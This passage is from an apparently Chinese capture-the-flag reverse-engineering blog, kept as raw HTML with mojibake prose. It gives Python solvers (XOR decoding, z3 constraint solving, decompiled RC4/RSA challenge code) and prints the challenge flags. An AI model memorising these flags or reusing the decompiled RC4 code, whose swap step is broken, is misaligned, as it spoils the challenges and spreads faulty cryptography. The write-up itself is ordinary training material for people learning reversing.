data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'æ— è§£'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token builtin\">str</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p just_f00ls_d@y_r3_ch3ck-in!>ctfshow</p>\n<h4 id=\"easy_cc\"><a class=\"markdownIt-Anchor\" href=\"#easy_cc\">#</a> easy_cc</h4>\n<p>32 ä½ IDA æ‰“å¼€ ç¨‹åºé€»è¾‘å¾ˆç®€å•  ç›´æ¥è§£ ä¸Šè„šæœ¬</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>eee<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key<span class=\"token operator\">=</span><span class=\"token string\">'key123'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>key<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v17<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>eee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    v17<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>eee<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>v17<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>strr<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>v17<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    strr<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v17<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p cc_re_good_good!>ctfshow</p>\n<h4 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> babyre</h4>\n<p>åŠ¨è°ƒ</p>\n<p><img data-src=\"/images/image-20230402160324387.png\" alt=\"image-20230402160324387\"></p>\n<p>æå–çš„æ¯”è¾ƒæ•°æ® [0x79, 0x8F, 0xAA, 0xEE, 0x69, 0x6A, 0x65, 0x53, 0x2B, 0xEE, 0x7B, 0x80, 0x9B, 0xD7, 0x7D, 0x9B, 0xD0, 0x2B, 0xE8, 0x71, 0x7E, 0x9B, 0xBD, 0xFD]</p>\n<p><img data-src=\"/images/image-20230402161233601.png\" alt=\"image-20230402161233601\"></p>\n<p>çœ‹çœ‹åŠ å¯†å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230402161428887.png\" alt=\"image-20230402161428887\"></p>\n<p>æˆ‘ç›´æ¥å¼€çˆ† (å…¶å®æ˜¯ z3)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># åˆå§‹åŒ–åºåˆ—</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># åˆ›å»ºçº¦æŸæ±‚è§£å™¨</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>cp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>l<span class=\"token operator\">=</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token builtin\">sum</span><span class=\"token operator\">=</span>temp<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token builtin\">sum</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    temp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">sum</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>temp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>get flag<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span><span class=\"token number\">119</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">,</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">117</span><span class=\"token punctuation\">,</span><span class=\"token number\">110</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">121</span><span class=\"token punctuation\">,</span><span class=\"token number\">125</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>strr<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    strr<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#ctfshow&#123;have_1_fun_day&#125;</span></pre></td></tr></table></figure><p have_1_fun_day>å¼—æ‹‰æ ¼ä¸º ctfshow</p>\n<h4 id=\"easy_re\"><a class=\"markdownIt-Anchor\" href=\"#easy_re\">#</a> easy_re</h4>\n<p><img data-src=\"/images/image-20230402170213727.png\" alt=\"image-20230402170213727\"></p>\n<p>32 ä½ç›´æ¥ IDA</p>\n<p><img data-src=\"/images/image-20230402170739439.png\" alt=\"image-20230402170739439\"></p>\n<p>é€»è¾‘ä¹Ÿå¾ˆæ¸…æ™° é—®é¢˜æ˜¯è·å– key å¯ä»¥é€šè¿‡çˆ†ç ´ï¼Ÿåé¢æ€ä¹ˆåŠ åšä¸æ¥æ‘†çƒ‚äº† ç­‰ wp</p>\n<h2 id=\"not_a_like\"><a class=\"markdownIt-Anchor\" href=\"#not_a_like\">#</a> not_a_like</h2>\n<p>NKCTF ä¸€é“é¢˜ï¼Œå’Œå‰é¢çš„ ez_z3 ç±»ä¼¼ é­”æ”¹çš„ UPX å£³ï¼Œä¸åŒçš„æ˜¯å®ƒä¸æ˜¯ä¿®æ”¹äº†åŒºæ®µå¤´åå­—è€Œæ˜¯ç›´æ¥æŠ¹å»äº†</p>\n<p><img data-src=\"/images/image-20230401150936440.png\" alt=\"image-20230401150936440\"></p>\n<p>å’Œæ­£å¸¸çš„ä¸€å¯¹æ¯”å°±èƒ½è¡¥å……ä¸Šå¤´éƒ¨äº†</p>\n<p><img data-src=\"/images/image-20230401152446898.png\" alt=\"image-20230401152446898\"></p>\n<p>(å…¶å®ä½ç½®æ²¡æœ‰è§„å®šçš„é‚£ä¹ˆå›ºå®š)</p>\n<p>ç›´æ¥è§£ upx ç„¶åæ”¾è¿› IDA ä¸­çœ‹ å¯åˆ¤æ–­ä¸º py æ‰“åŒ… (ä¹Ÿå¯ä»ç¨‹åºçš„å¤§å°å¾ˆå¤§çœ‹å‡º)</p>\n<p>ç›´æ¥ python <span class=\"exturl\" data-url=\"aHR0cDovL3B5aW5zdHh0cmFjdG9yLnB5\">pyinstxtractor.py</span> not_a_like.exe (è¿™é‡Œå…¶å®è­¦å‘Šè¯´æ˜¯ python3.8 æˆ‘æ˜¯ 3.10 ä½†å‘ç°æ²¡å½±å“åé¢)</p>\n<p>ç›´æ¥æ‰¾åœ¨çº¿å·¥å…·è§£å¯† pyc å¾—ä»¥ä¸‹ py è„šæœ¬</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># visit https://tool.lu/pyc/ for more information</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Version: Python 3.8</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    data_xor_iv <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    sbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    x <span class=\"token operator\">=</span> y <span class=\"token operator\">=</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token string\">'911dcd09ad021d68780e3efed1aa8549'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        sbox<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        j <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">for</span> idx <span class=\"token keyword\">in</span> text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        y <span class=\"token operator\">=</span> y <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        k <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data_xor_iv<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>idx <span class=\"token operator\">^</span> k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> data_xor_iv</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    flag <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%e8%af%b7%e8%be%93%e5%85%a5flag> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    pub_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        0x1B6A7561D99E6FC35BA3C241159424698BF3CAC017CFCE8BB325CC9AF9CBCBDB3997B08D922C8705FC3EEAEF50D60ADAB2757A7204715483A1D612502970595358BCFE9CD11C98CAD293EB921D777F4F910905D79CDCA5C1EC1FBA5DA74DB165F82BBE29EA0B2E597860FC6D2C51C12D46BF11AFA5018496DDFC3474B10B4457L<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        0x6C8E1CC5B384DE3B3316C22CF72D9895406298E172B5F4D890BDC04889BB43CD4892689DE701C84ED68B4CBC7193926BCCB0A4F259D2E752FAEF3CD590A793F120D15424AEB3CD53F5D59B5D41D699694ABF4F01532F0F1CE127B07958FB874982E757EF97643335376790BC990CEE9D7F0D05DA90AD62084C88BFA9C9BEB683L<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    m <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    q <span class=\"token operator\">=</span> <span class=\"token 